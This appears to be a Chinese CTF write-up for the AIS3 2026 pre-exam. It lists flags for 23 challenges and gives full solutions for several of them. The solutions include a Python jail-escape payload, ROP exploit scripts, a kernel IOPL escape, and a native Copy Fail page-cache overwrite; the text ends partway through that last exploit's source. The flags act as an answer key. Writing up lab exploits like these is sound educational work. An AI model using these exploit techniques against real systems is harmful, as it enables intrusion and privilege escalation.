---
title: "AIS3 2026 Pre-exam Writeup"
description: "AIS3 2026 前測 23 題完整解題紀錄，涵蓋 Pwn、Reverse、Web、Crypto、Misc、OSINT。"
publishDate: "2026-05-16"
tags: ["CTF", "Writeup", "AIS3", "Pwn", "Reverse", "Web", "Crypto", "Misc", "2026"]
draft: false
pinned: true
---

AIS3 2026 前測的完整解題紀錄，23 題全解。

## 總覽

| 題目 | 類型 | Flag |
|---|---|---|
| Welcome | Welcome | `AIS3{Hello_LLM_welcome_to_pre_exam_2026!}` |
| Hidden in the Cloak | Rev | `AIS3{d0n7_70uch_my_c4p3_0k_b3f1e768}` |
| Jail Revenge | Jail | `AIS3{D3MN_21P_PYD0C_A5_-_-MA1N-_-_D07_PY}` |
| std::print("Hello, World") revenge | Pwn | `AIS3{f4k3_fl4g_1s_4ls0_4_fl4g}` |
| DG Server (Rev) | Rev | `AIS3{w4lking_0n_D0H_z0n3--NSEC...NSEC6!_666~~~}` |
| DG Server (Pwn) | Pwn | `AIS3{B4d_bAd_64d_D0H_p4r(rr)rs3r[rr]r_:(((_QQ}` |
| 獨屬於你的魔法 | Pwn | `AIS3{The_true_magic_is_in_the_journey_of_finding_it@I_believe_you_found_your_own_magic_on_your_own!}` |
| Kernel0Day | Misc | `AIS3{WHY_Ne3D_K3RN3L_z3R0_d@Y_wH3n_Y0u_aLr3Ady_h@cK3D_the_HYpeRvi5or}` |
| EasyFAULT | Crypto | `AIS3{lll_then_lll_then_lll_then_lll_owob}` |
| blooockchain | Pwn | `AIS3{SIMPl3_BLocKch@1n_n0t_s1mple_Pwn}` |
| 特別的愛給特別的你 | Pwn | `AIS3{This_Is_a_SpeCia1_LLLLLLLLLOVE_FOR_y0U@Do_Y0u_L1k3_mY_lOv3?}` |
| Tea God World Adventure | Web | `AIS3{734_60d_f1l3l355_rc3_1n_4n07h3r_w0rld}` |
| MyGO!!!!! X Ave Mujica 圖庫 | Web | `AIS3{BangDream_AveMujica_Exitus_at_Taiwan_8/8_and_I_don't_have_ticket}` |
| 哇!金色傳說 | Rev | `AIS3{At_Least_U_DIDNT_MODIFY_MY_MONEY_RIGHT?}` |
| ooonvifd | Pwn | `AIS3{LiTTL3_Re@L_wORlD_pWN_BU7_I_tHInK_ai_Wri735_3Xplo1t_Fa5t3R}` |
| EasyZKP | Crypto | `AIS3{simple_oracle_and_dramatic_injections_leading_forge_XDDD}` |
| Lua Opcode Shuffling | Rev | `AIS3{Lu4_0pc0d3_Shuffl1ng_1s_Fun}` |
| ƐSI∀ Sǝɔɹǝʇ Ⅎlɐƃ Sɥod | Misc | `AIS3{h3r3_i5_7h3_f149_y0u_0rd3r3d_d86316d3c73f4918b89f396fe6d1ea4c}` |
| Give Me Flag | Web | `AIS3{c_5h4rp_c0n57ruc70r_p0llu710n_877f81c2db77402abf24f824f99e56c7}` |
| 想在雪中來杯下午茶嗎? | OSINT | `AIS3{35.193-136.226}` |
| Jail | Misc | `AIS3{5H3_BA_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_NG!}` |
| EasyWEB | Crypto | `AIS3{copy_and_paste_the_flag}` |
| tetris，簡單 | Rev | `AIS3{T3tr1s_P4tt3rn_M4st3r!}` |

---

## Welcome

### 題目

題目一開始給的是一個會動的 QR code。直接用一般 QR code 掃描器掃的話不太穩，因為畫面一直在變，所以重點不是單張 QR 的內容，而是要找到能處理「動態 QR code」的工具。

### 解法

我先從畫面中隨機截一張 QR code 的截圖，拿去用 QR code 掃描工具解析。解析後會得到一個 URL，打開之後是一個專門用來掃描動態 QR code 的網站工具。

進到網站後，把掃描頻率調成 `5 Hz`，讓它可以穩定地讀取每秒變化的 QR code。等待工具掃描一段時間後，就會把隱藏在動態 QR code 裡的內容解出來。

### Flag

```text
AIS3{Hello_LLM_welcome_to_pre_exam_2026!}
```

---

## Hidden in the Cloak

### 思路

這題是一個 Unity Mono 遊戲。Flag 沒有放在一般程式驗證邏輯或明文字串裡，而是藏在角色 Spine 資源中。角色素材被拆成 atlas attachment，最後要依照 Spine animation `emote_a` 的位移與旋轉資訊，才能把碎片重新排成完整 flag。

路線大概是：

```text
Unity Mono build
→ Reverse1_Data/StreamingAssets/bundles/character_main
→ 匯出 Spine atlas / skeleton
→ 從 atlas 看到可疑文字碎片
→ 分析 character.txt 裡的 emote_a 動畫
→ 依 bone / slot / attachment 關係重建文字
```

### 觀察

- 這是 Unity Mono 遊戲。
- `Assembly-CSharp.dll` 中沒有直接出現完整 `AIS3{...}`。
- 主要線索在角色 Spine bundle，而不是遊戲程式邏輯。
- 匯出後的關鍵檔案是：

```text
character_export/character.png
character_export/character.atlas.txt
character_export/character.txt
```

其中：

- `character.png` 是 Spine atlas 貼圖。
- `character.atlas.txt` 是 atlas 切片資訊。
- `character.txt` 是 Spine skeleton / animation JSON。

### 做法

1. 解開題目壓縮檔與巢狀的 `B.zip`。
2. 檢查 Unity 建置後的目錄結構，確認關鍵 bundle 位於：

```text
Reverse1_Data/StreamingAssets/bundles/character_main
```

3. 從 bundle 匯出 Spine 相關檔案。
4. 直接看 atlas，會看到 flag 被拆成很多片。

打開 `character_export/character.png` 後，會看到一張很奇怪的圖：

- 上半部很多白色矩形。
- 黑底上散落很多白色字元。
- 明顯可見 `AIS3{`。
- 也可以看到像 `uch_my_`、`d0n7_70`、`c4p3_0k_`。
- 其他部分則被拆成單字元。

把 atlas 上的切片整理成 contact sheet 後更清楚，重要碎片大概是：

```text
AIS3{
d0n7_70
uch_my_
c4p3_0k_
b
3
f
1
e
7
6
8
}
```

這時其實已經很接近答案，但還不能直接保證順序正確。

5. 關鍵在 Spine 動畫 `emote_a`。

`character.txt` 裡有一段非常關鍵的動畫資料：

- animation name: `emote_a`
- bones: `b013` 到 `b025`
- 在 `time = 0.75` 時，這些 bone 會被平移到一整排。
- 同時 rotation 也會回到 `0`。

這代表那些原本散落在 atlas 上的字串碎片，實際上會在動畫播放時被排成一行。換句話說：

- atlas 上看到的是「零件」。
- `emote_a` 才是把零件拼回正確句子的方式。

6. 依照 `emote_a` 重建字串。

把 `s013` 到 `s025` 對應的 attachment：

- 按 `character.txt` 的 slot / bone 關係取出。
- 套用 `emote_a` 在 `time = 0.75` 的位移。
- 把 rotation 歸零後重新排版。

重建後的結果是：

```text
AIS3{ d0n7_70 uch_my_ c4p3_0k_ b 3 f 1 e 7 6 8 }
```

把中間空白拿掉後就是 flag。

### 總結

這題的重點不是逆出一段複雜演算法，而是：

1. 先判斷這是 Unity Mono 遊戲。
2. 確認角色是用 Spine bundle 載入。
3. 從角色 atlas 看出有可疑文字碎片。
4. 回到 skeleton / animation JSON。
5. 利用 `emote_a` 把碎片依正確位置重排。

### Flag

```text
AIS3{d0n7_70uch_my_c4p3_0k_b3f1e768}
```

---

## Jail Revenge

### 思路

服務會公開 Flask 原始碼。它把使用者的 POST body 接在固定 Python shebang 後，先做 NFKC 正規化，再阻擋以下字元：

```text
()_[]{}.@#
```

突破點是：讓 shebang 同時帶 Python option 與 source encoding 宣告，接著用 `unicode-escape` 讓被禁止的字元在 Python 解碼原始碼之後才出現。

### 觀察

- 讀取 `/` 可以看到 jail 原始碼。
- Flag 位於 `/flag`。
- 端點必須收到 raw body。
- `Content-Type` 要用 `application/octet-stream`，否則 Flask 表單解析會讓 `request.data` 變空。
- Payload 第一行要在 50 bytes 內，而且不能包含被擋字元。

### 做法

第一行 payload：

```text
 -Xutf8 coding:unicode-escape
```

這行仍可作為合法 shebang 參數，同時 Python 會辨識 `coding:unicode-escape`。

接著用 escape sequence 表示被擋掉的字元：

```py
import os
os\x2esystem\x28"cat /flag"\x29
```

Python 解碼後實際執行：

```py
os.system("cat /flag")
```

### Payload

實際送出時重點只有 raw body；路徑用任意 UUID 即可。

```text
 -Xutf8 coding:unicode-escape
import os
os\x2esystem\x28"cat /flag"\x29
```

### Flag

```text
AIS3{D3MN_21P_PYD0C_A5_-_-MA1N-_-_D07_PY}
```

---

## std::print("Hello, World") revenge

### 思路

Binary 保護狀態：

```text
non-PIE
NX enabled
Full RELRO
No stack canary
```

`main()` 會把 `flag.txt` 載入全域 buffer，然後反覆呼叫 `Question()`。`Question()` 將 `0xe0` bytes 讀進 `0x50` bytes stack buffer，因此 saved return address 可在 offset 88 被覆寫。

### 觀察

Full RELRO 開啟後不適合打 GOT overwrite。更好的做法是重用程式內靜態連結進來的 C++ format code，其中存在一個可利用的 `fwrite` call site。

關鍵位址：

```text
FLAG buffer:                       0x427040
stdout pointer:                    0x427020
pop rdi; pop rbp; ret:             0x416e51
pop rbx; pop r12; pop rbp; ret:    0x405d7f
fwrite call site:                  0x40456a
```

`0x40456a` 附近邏輯：

```asm
mov rax, [rbp-0x1f8]
mov rcx, rax
mov rdx, rbx
mov esi, 1
call fwrite
```

### 做法

ROP chain 需要設定：

```text
rdi = FLAG
rbx = 0x7f
rbp = stdout + 0x1f8
```

如此一來：

```text
[rbp - 0x1f8] = stdout FILE pointer
```

最後跳到 `0x40456a`，即可把已載入的 flag buffer 印出。

### Exploit

```py
from pwn import *

context.clear(arch='amd64', log_level='error')
elf = ELF('./chall')

pop_rdi = 0x416e51
pop_rbx = 0x405d7f
fwrite_site = 0x40456a

payload = b'Y' + b'A' * 87
payload += p64(pop_rdi) + p64(elf.symbols['_ZL4FLAG']) + p64(0)
payload += p64(pop_rbx) + p64(0x7f) + p64(0) + p64(elf.symbols['stdout'] + 0x1f8)
payload += p64(fwrite_site)

io = remote('chals1.ais3.org', 50002)
io.recvline()
io.send(payload)
print(io.recvall(timeout=5).decode('latin1', 'replace'))
```

### Flag

```text
AIS3{f4k3_fl4g_1s_4ls0_4_fl4g}
```

---

## DG Server (Rev)

### 思路

伺服器實作一條 DNS-over-HTTP 的 toy DNSSEC chain，並加上自訂的 NSEC6 denial-of-existence record。驗證器只檢查一般 `A / NS / MX` answers，但逆向 binary 後可發現 NSEC6 record 會洩漏 hashed zone names。

在 `curious.sleeping.` zone 中，NSEC6 key 退化，導致原本看似 hash 的 owner value 可以反推，最後找到藏有 flag 的 TXT owner。

### 觀察

- Chain 為：

```text
. -> sleeping. -> curious.sleeping.
```

- `dg-verify.py` 不支援未文件化的 NSEC6 type，但 binary 本身支援。
- NSEC6 chain 會揭露 hashed owners 與 type bitmaps。
- 自訂 base32 alphabet：

```text
0123456789ABCDEFGHIJKLMNOPQRSTUV
```

- 在 `curious.sleeping.` 中，兩個 Ed25519 public-key tails 與常數 XOR 後，使 key 前 20 bytes 變成 `0xff`。
- 程式將真 hash 與這些 bytes 做 OR，導致 hash 被抹掉，只剩可逆編碼。

### 做法

1. 查詢 `www.curious.sleeping A`，理解 chain。
2. 收集 `curious.sleeping.` 的 DNSKEY set。
3. 查詢未文件化的 NSEC6 record。
4. 逆向 NSEC6 owner value 建構方式。
5. 反推 NSEC6 owners，得到 labels：

| NSEC6 owner | 還原 label |
|---|---|
| `H46HSBFKHOSNE7FP2CD05BFU13HKIUGI` | `_dmarc` |
| `H46HSBFKHOSNE7FP4U5AT4KL73HKIUGI` | `status` |
| `S6NPJID2K4SNE7AB754D34I8IK3E8TKJ` | `azft0azxct7utcyw` |

6. 查詢：

```text
azft0azxct7utcyw.curious.sleeping. TXT
```

取得 flag。

### Flag

```text
AIS3{w4lking_0n_D0H_z0n3--NSEC...NSEC6!_666~~~}
```

---

## DG Server (Pwn)

### 思路

同一個 `dg-server` 也可以當 pwn 題打。服務看起來像 DoH-like x86-64 binary，前面有 DNSSEC-like 的 Ed25519 chain；不過這條路線的重點不是 record 驗證，而是 HTTP `/dns-query` 裡 `type=` 的 parser。

我這邊抓到兩個效果：

- invalid decoded query type 會被放進 JSON 的 `bad_type`，而且是用 hex 形式回顯。
- 同一段 decoded type 欄位可以被塞到 overflow，後面接 ROP。

所以流程就是先用錯誤 type leak stack，拿 canary；再把同一個 parser 當入口送 ROP。最後用 two-stage ROP，把第二段 chain 讀到 `.bss` 後 pivot 過去讀 `/flag.txt`。

### 觀察

Leak 用的 type 大概長這樣：

```text
AAAAAAAAAAAAAAAA%a0%00
```

回應中的 `bad_type` 會是一串很長的 hex。把它 decode 回 bytes 後，在我用 raw-port exploit 的路徑裡，canary 位於 offset `0x38`。

Overflow payload 的大致 layout：

```text
16 bytes padding
u16 0
u16 0x20
padding to 0x38
leaked canary
saved rbp filler
ROP
```

第一段 ROP 不做太多事，只負責：

```text
read(4, .bss, len(stage2))
pop rsp; ret
```

第二段才放真正的 syscall chain：

```text
write "/flag.txt" 到 .bss
open("/flag.txt", 0, 0)
read(fd, flag_buf, 0x100)
write(4, flag_buf, 0x100)
```

幾個有用的 gadgets：

```text
pop rdi; ret                   0x69a383
pop rsi; ret                   0x46958e
pop rdx; ret                   0x4d5513
pop rax; ret                   0x694ed4
pop rsp; ret                   0x69d1b6
mov edi, eax; ret              0x6bd710
mov qword ptr [rsi], rax; ret  0x758aa5
syscall; ret                   0x711d26
writable .bss staging          0x8f9000
```

### 做法

1. 用 invalid `type=` 讓 server 把錯誤內容丟到 `bad_type`。
2. Decode `bad_type` 的 hex，從 offset `0x38` 拿 stack canary。
3. 組第一段 payload：保留 canary，saved rbp 塞 filler，ROP 呼叫 `read(4, BSS, len(stage2))`。
4. 第一段最後用 `pop rsp; ret` pivot 到 `.bss`。
5. 第二段 chain 寫入 `/flag.txt` 字串，然後走 `open / read / write`。
6. `write` 的 fd 用 `4`，因為這條連線上 service socket 對應到 fd 4。

### Exploit

```python
#!/usr/bin/env python3
import re
import socket
import struct
import time


HOST = "chals1.ais3.org"
PORT = 57573

POP_RDI = 0x69A383
POP_RSI = 0x46958E
POP_RDX = 0x4D5513
POP_RAX = 0x694ED4
POP_RSP = 0x69D1B6
MOV_EDI_EAX = 0x6BD710
MOV_QWORD_PTR_RSI_RAX = 0x758AA5
SYSCALL = 0x711D26
BSS = 0x8F9000


def qword(value: int) -> bytes:
    return struct.pack("<Q", value)


def request(rrtype: str) -> bytes:
    return (
        f"GET /dns-query?name=www.curious.sleeping.&type={rrtype} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    ).encode()


def percent_encode(data: bytes) -> str:
    return "".join(f"%{byte:02x}" for byte in data)


def leak_canary() -> int:
    with socket.create_connection((HOST, PORT), timeout=8) as sock:
        sock.sendall(request("A" * 16 + "%a0%00"))
        response = bytearray()
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk

    match = re.search(rb'bad_type":"([0-9a-f]+)', response)
    if not match:
        raise RuntimeError(response[:300])

    leaked = bytes.fromhex(match.group(1).decode())
    return struct.unpack("<Q", leaked[0x38:0x40])[0]


def build_stage_two() -> bytes:
    flag_path = BSS + 0x500
    flag_buf = BSS + 0x600
    chain = [
        POP_RAX, int.from_bytes(b"/flag.tx", "little"),
        POP_RSI, flag_path,
        MOV_QWORD_PTR_RSI_RAX,
        POP_RAX, int.from_bytes(b"t\0".ljust(8, b"\0"), "little"),
        POP_RSI, flag_path + 8,
        MOV_QWORD_PTR_RSI_RAX,
        POP_RAX, 2,
        POP_RDI, flag_path,
        POP_RSI, 0,
        POP_RDX, 0,
        SYSCALL,
        MOV_EDI_EAX,
        POP_RSI, flag_buf,
        POP_RDX, 0x100,
        POP_RAX, 0,
        SYSCALL,
        POP_RAX, 1,
        POP_RDI, 4,
        POP_RSI, flag_buf,
        POP_RDX, 0x100,
        SYSCALL,
        POP_RAX, 60,
        POP_RDI, 0,
        SYSCALL,
    ]
    return b"".join(qword(value) for value in chain)


def build_stage_one(canary: int, stage_len: int) -> bytes:
    payload = bytearray(b"B" * 16 + struct.pack("<H", 0) + struct.pack("<H", 0x20))
    payload += b"C" * (0x38 - len(payload))
    payload += qword(canary)
    payload += b"D" * 8
    chain = [
        POP_RAX, 0,
        POP_RDI, 4,
        POP_RSI, BSS,
        POP_RDX, stage_len,
        SYSCALL,
        POP_RSP, BSS,
    ]
    payload += b"".join(qword(value) for value in chain)
    return bytes(payload)


def main() -> None:
    canary = leak_canary()
    stage_two = build_stage_two()
    stage_one = build_stage_one(canary, len(stage_two))

    with socket.create_connection((HOST, PORT), timeout=8) as sock:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.sendall(request(percent_encode(stage_one)))
        time.sleep(0.8)
        sock.sendall(stage_two)

        response = bytearray()
        sock.settimeout(6)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except TimeoutError:
            pass

    flag = re.search(rb"AIS3\{[^\n}]+\}", response)
    if not flag:
        raise RuntimeError(response)
    print(flag.group(0).decode())


if __name__ == "__main__":
    main()
```

### Flag

```text
AIS3{B4d_bAd_64d_D0H_p4r(rr)rs3r[rr]r_:(((_QQ}
```

---

## 獨屬於你的魔法

### 思路

這題不是傳統 kernel ROP 提權題。`/dev/wand` 讓使用者控制 `iretq` 回 userspace 的完整 frame。雖然 trampoline 會強制回到 ring3，但 driver 沒有過濾 `RFLAGS`，因此可以把 `IOPL=3` 帶回 userland。

取得 `IOPL=3` 後，就可以在 ring3 直接執行 `in/out` 指令，透過 QEMU `fw_cfg` 讀出遠端 initrd 內容，並從 initrd 中掃出真正的 flag。

### 題目觀察

附件重點檔案：

```text
run.sh
initramfs.cpio
kernel.config
```

`run.sh` 顯示：

```text
-kernel bzImage
-initrd initramfs.cpio
-cpu qemu64,+smap,+smep
-append "console=ttyS0 quiet loglevel=3 oops=panic panic_on_warn=1 panic=-1 pti=on nokaslr noapic"
```

可知：

- SMEP enabled
- SMAP enabled
- PTI enabled
- `nokaslr`，kernel base 固定
- 遠端 exploit 會被當成磁碟掛進 guest

解 initramfs 後可看到：

```sh
cp /dev/sda /tmp/e
chmod +x /tmp/e
insmod /driver/wand.ko
```

也就是說遠端 instance 啟動後，執行 `/tmp/e` 即可跑 exploit。

### 關鍵漏洞

`wand.c` 的核心資料結構：

```c
struct iret_frame {
    __u64 rip;
    __u64 cs;
    __u64 rflags;
    __u64 rsp;
    __u64 ss;
};

#define WAND_CAST _IOW(WAND_MAGIC, 0, struct iret_frame)
```

`wand_ioctl()` 會：

1. `copy_from_user()` 讀入使用者提供的 `iret_frame`。
2. 將 `rip/cs/rflags/rsp/ss` 寫進 `magic_core`。
3. 將 kernel `rsp` pivot 到 `magic_core`。
4. `jmp` 到固定的 trampoline `SWAPGS_RESTORE_ADDR`。

簡化後：

```c
void *pivot = magic_core;
unsigned long tramp = swapgs_restore_addr;

asm volatile(
    "mov %0, %%rsp\n\t"
    "jmp *%1\n\t"
    :: "r"(pivot), "r"(tramp) : "memory"
);
```

問題在於：trampoline 會檢查 `CS` 必須回 ring3，但沒有清掉或限制 `RFLAGS` 中的 IOPL bits。

### Exploit 思路

把 `RFLAGS.IOPL` 設為 3：

```c
frame.rflags = rflags | (3ULL << 12) | (1ULL << 9);
```

回到 userland 後即可直接使用 I/O port 指令。

QEMU `fw_cfg` 常用 port：

| 功能 | Port / Selector |
|---|---|
| selector port | `0x510` |
| data port | `0x511` |
| `FW_CFG_SIGNATURE` | `0x00` |
| `FW_CFG_INITRD_SIZE` | `0x0b` |
| `FW_CFG_INITRD_DATA` | `0x12` |

### 做法

1. 呼叫 `/dev/wand` ioctl，讓 kernel trampoline 用我們提供的 `iret_frame` 回到 userland。
2. 在 `iret_frame.rflags` 中設定 `IOPL=3`。
3. 回到 userland 的 `win()`。
4. 使用 `outw(0x510)` 選擇 QEMU `fw_cfg` selector。
5. 使用 `inb(0x511)` 逐 byte 讀資料。
6. 讀出 initrd size 與 initrd data。
7. 在 initrd data stream 中搜尋 `AIS3{...}`。

### 核心程式片段

```c
#define FW_CFG_PORT_SEL    0x510
#define FW_CFG_PORT_DATA   0x511
#define FW_CFG_SIGNATURE   0x00
#define FW_CFG_INITRD_SIZE 0x0b
#define FW_CFG_INITRD_DATA 0x12

#define USER_CS 0x33
#define USER_SS 0x2b

static inline void outw16(uint16_t value, uint16_t port) {
    __asm__ volatile("outw %0, %1" : : "a"(value), "Nd"(port));
}

static inline uint8_t inb8(uint16_t port) {
    uint8_t value;
    __asm__ volatile("inb %1, %0" : "=a"(value) : "Nd"(port));
    return value;
}
```

設定 frame：

```c
__asm__ volatile("pushfq; pop %0" : "=r"(rflags));

frame.rip = (uint64_t)win;
frame.cs = USER_CS;
frame.rflags = rflags | (3ULL << 12) | (1ULL << 9);
frame.rsp = stack_top;
frame.ss = USER_SS;

ioctl(fd, WAND_CAST, &frame);
```

讀取 big-endian u32：

```c
static uint32_t fw_cfg_read_be32(uint16_t selector) {
    uint32_t v = 0;
    outw16(selector, FW_CFG_PORT_SEL);
    for (int i = 0; i < 4; i++) {
        v = (v << 8) | inb8(FW_CFG_PORT_DATA);
    }
    return v;
}
```

### 為什麼不是 kernel ROP

一開始很容易往傳統 kernel exploit 想：

- `nokaslr`
- fixed trampoline
- 可能可以接 `commit_creds(prepare_kernel_cred(0))`

但實際上：

- driver 最後強制回 ring3
- `CS` 會被檢查
- SMEP / SMAP 都開著
- 真正可控且有價值的是 `RFLAGS`

因此主要路線是：

```text
控制 iret_frame
-> 設定 IOPL=3
-> 回 userland
-> ring3 使用 in/out
-> QEMU fw_cfg
-> INITRD_DATA
-> 掃出 flag
```

### 遠端流程

1. 解 PoW。
2. 輸入 CTFd token。
3. 回答 `NEED_UPLOAD_EXPLOIT (y/n)` 為 `y`。
4. 提供 exploit URL。
5. instance 啟動後，在 guest shell 執行 `/tmp/e`。

### Flag

```text
AIS3{The_true_magic_is_in_the_journey_of_finding_it@I_believe_you_found_your_own_magic_on_your_own!}
```

---

## Kernel0Day

### 思路

這題是一台 Linux 6.1.81 的小 VM。SMEP、SMAP、KASLR 都開著，正常打 kernel exploit 成本不低。不過題目 hint 給得很明顯，`.hint.txt` 指到 Copy Fail，也就是 AF_ALG 搭配 `splice` 的那個 page cache overwrite bug。

公開 PoC 常見是改 `/usr/bin/su`，但 rootfs 裡沒有獨立的 `su`，`/bin/su` 只是 BusyBox applet。所以我改成污染 `/bin/busybox` 的 page cache 第一頁，把它換成一個只會讀 `/flag` 並印出的 tiny ELF。

跑完 helper 之後離開 shell，`/init` 會繼續以 root 身分跑 BusyBox applet，像是 `umount`、`poweroff`。這時 `/bin/busybox` 的 cache 已經被換成我的 payload，所以 root 執行 BusyBox 時就會直接把 flag 印出來。

### 觀察

```text
kernel: Linux 6.1.81
SMEP / SMAP: enabled
KASLR: enabled
hint: Copy Fail / CVE-2026-31431
target: /bin/busybox
```

幾個關鍵點：

- guest 裡沒有 Python，不能直接丟 Python PoC。
- `/usr/bin/su` 不存在，不能照公開 PoC 的目標打。
- `/init` 在 user shell 結束後，還會用 root context 執行 BusyBox。
- 所以 `/bin/busybox` 是比較穩的污染目標。
- native port 時有一個坑：每次 4-byte overwrite 後要照 PoC drain `recv(8 + offset)`，不能固定收一點點，不然後面的 chunk 會歪掉。

### 做法

先把 Copy Fail primitive 改成 syscall-only C，靜態編成 `tiny_cf`。`tiny_cf` 會打開 `/bin/busybox`，每次寫 4 bytes，把第一頁換成內嵌的 tiny ELF payload。

payload 本身只做：

```text
open("/flag")
read()
write(1)
exit()
```

接著用 WebSocket serial session 把 `tiny_cf` 傳進 VM：

```text
uuencode -> cat > /tmp/cf.uue -> uudecode -> chmod +x -> /tmp/cf
```

helper 跑完後直接 `exit` 離開 user shell，讓 `/init` 自己走到 root 的 BusyBox execution path。

### Build / run

```sh
gcc -Os -fno-builtin -static -nostdlib -fno-stack-protector -no-pie -s \
  -o tiny_cf tiny_cf.c

CTFD_TOKEN='<your token>' node solve.js
```

成功時會看到類似：

```text
patch
readback_payload
done
AIS3{WHY_Ne3D_K3RN3L_z3R0_d@Y_wH3n_Y0u_aLr3Ady_h@cK3D_the_HYpeRvi5or}
```

### solve.js

```js
const fs = require('fs');
const crypto = require('crypto');

const base = 'http://chals1.ais3.org:11451';
const token = process.env.CTFD_TOKEN;

if (!token) {
  console.error('missing CTFD_TOKEN');
  process.exit(1);
}

function uue(buf, name) {
  let s = `begin 755 ${name}\n`;

  for (let i = 0; i < buf.length; i += 45) {
    const b = buf.slice(i, i + 45);
    s += String.fromCharCode(32 + b.length);

    for (let j = 0; j < b.length; j += 3) {
      const a = b[j];
      const c = j + 1 < b.length ? b[j + 1] : 0;
      const d = j + 2 < b.length ? b[j + 2] : 0;

      const v = [
        (a >> 2) & 63,
        ((a << 4) | (c >> 4)) & 63,
        ((c << 2) | (d >> 6)) & 63,
        d & 63,
      ];

      for (const x of v) s += String.fromCharCode(x ? x + 32 : 96);
    }

    s += '\n';
  }

  return s + '`\nend\n';
}

function zeroBits(h, bits) {
  const n = bits >> 3;

  for (let i = 0; i < n; i++) {
    if (h[i]) return false;
  }

  const r = bits & 7;
  return !r || (h[n] >>> (8 - r)) === 0;
}

async function pow() {
  const chal = await (await fetch(base + '/pow/challenge')).json();

  for (let nonce = 0;; nonce++) {
    const h = crypto
      .createHash('sha256')
      .update(chal.challenge + ':' + nonce)
      .digest();

    if (!zeroBits(h, chal.difficulty)) continue;

    const res = await (await fetch(base + '/pow/verify', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ challenge: chal.challenge, nonce }),
    })).json();

    return res.pow_token;
  }
}

function delay(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

async function paste(ws, s) {
  const enc = new TextEncoder();

  for (let i = 0; i < s.length; i += 512) {
    ws.send(enc.encode(s.slice(i, i + 512)));
    await delay(15);
  }
}

(async () => {
  const bin = fs.readFileSync('./tiny_cf');
  const body = uue(bin, 'cf');
  const sha = crypto.createHash('sha256').update(bin).digest('hex');

  console.log('[tiny]', bin.length, sha);
  console.log('[uue]', body.length);

  const ptok = await pow();
  console.log('[pow] ok');

  const ws = new WebSocket(
    'ws://chals1.ais3.org:11451/ws?token=' +
      encodeURIComponent(token) +
      '&pow_token=' +
      encodeURIComponent(ptok) +
      '&force=1',
  );

  ws.binaryType = 'arraybuffer';

  let log = '';
  let sent = false;
  let got = false;

  ws.onmessage = async (ev) => {
    if (typeof ev.data === 'string') {
      console.log('[ctl]', ev.data);
      return;
    }

    const s = Buffer.from(ev.data).toString('utf8');
    process.stdout.write(s);
    log += s;

    if (s.includes('\x1b[6n')) {
      ws.send(new TextEncoder().encode('\x1b[24;1R'));
    }

    if (!sent && log.includes('\x1b[6n')) {
      sent = true;
      await delay(800);

      const cmd =
        "cat > /tmp/cf.uue <<'EOF'\n" +
        body +
        "EOF\n" +
        '/bin/uudecode -o /tmp/cf /tmp/cf.uue\n' +
        'chmod +x /tmp/cf\n' +
        'wc -c /tmp/cf\n' +
        'sha256sum /tmp/cf\n' +
        '/tmp/cf\n' +
        '/bin/xxd -l 160 /bin/busybox\n' +
        '/bin/busybox; echo BUSYBOX_STATUS:$?\n' +
        'echo PATCH_DONE\n' +
        'exit\nexit\nexit\n';

      console.log('\n[send]');
      await paste(ws, cmd);
    }

    const m = log.match(/AIS3\{[^}\r\n]+\}/);
    if (m && !got) {
      got = true;
      console.log('\n[flag]', m[0]);
      setTimeout(() => ws.close(), 1000);
    }
  };

  ws.onclose = (e) => {
    console.log('\n[close]', e.code, e.reason);
    process.exit(got ? 0 : 1);
  };

  setTimeout(() => {
    if (!got) {
      console.log('\n[timeout]');
      ws.close();
    }
  }, 560000);
})();
```

### tiny_cf.c

```c
typedef unsigned long u64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;

#define AF_ALG 38
#define SOCK_SEQPACKET 5
#define SOL_ALG 279
#define ALG_SET_KEY 1
#define ALG_SET_OP 3
#define ALG_SET_IV 2
#define ALG_SET_AEAD_ASSOCLEN 4
#define ALG_SET_AEAD_AUTHSIZE 5
#define MSG_MORE 32768
#define O_RDONLY 0
#define SEEK_SET 0

struct sockaddr_alg {
  u16 salg_family;
  u8 salg_type[14];
  u32 salg_feat;
  u32 salg_mask;
  u8 salg_name[64];
};

struct iovec {
  void *iov_base;
  u64 iov_len;
};

struct msghdr {
  void *msg_name;
  u32 msg_namelen;
  u32 pad1;
  struct iovec *msg_iov;
  u64 msg_iovlen;
  void *msg_control;
  u64 msg_controllen;
  u32 msg_flags;
  u32 pad2;
};

struct cmsghdr {
  u64 cmsg_len;
  int cmsg_level;
  int cmsg_type;
};

static u8 elf[] = {
  127,69,76,70,2,1,1,0,0,0,0,0,0,0,0,0,2,0,62,0,1,0,0,0,
  120,0,64,0,0,0,0,0,64,0,0,0,0,0,0,0,128,1,0,0,0,0,0,0,
  0,0,0,0,64,0,56,0,1,0,64,0,5,0,4,0,1,0,0,0,7,0,0,0,
  120,0,0,0,0,0,0,0,120,0,64,0,0,0,0,0,120,0,64,0,0,0,0,0,
  79,0,0,0,0,0,0,0,79,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
  72,49,192,80,72,187,47,102,108,97,103,0,0,0,83,72,137,231,
  72,49,246,176,2,15,5,72,137,199,72,137,230,72,129,238,0,1,0,0,
  72,49,210,178,255,72,49,192,15,5,72,137,194,72,199,199,1,0,0,0,
  72,199,192,1,0,0,0,15,5,72,199,192,60,0,0,0,72,49,255,15,5
};

static inline long sc1(long n, long a)
{
  long r;
  asm volatile("syscall" : "=a"(r) : "a"(n), "D"(a) : "rcx", "r11", "memory");
  return r;
}

static inline long sc3(long n, long a, long b, long c)
{
  long r;
  asm volatile("syscall" : "=a"(r) : "a"(n), "D"(a), "S"(b), "d"(c) : "rcx", "r11", "memory");
  return r;
}

static inline long sc5(long n, long a, long b, long c, long d, long e)
{
  long r;
  register long r10 asm("r10") = d;
  register long r8 asm("r8") = e;
  asm volatile("syscall" : "=a"(r) : "a"(n), "D"(a), "S"(b), "d"(c), "r"(r10), "r"(r8) : "rcx", "r11", "memory");
  return r;
}

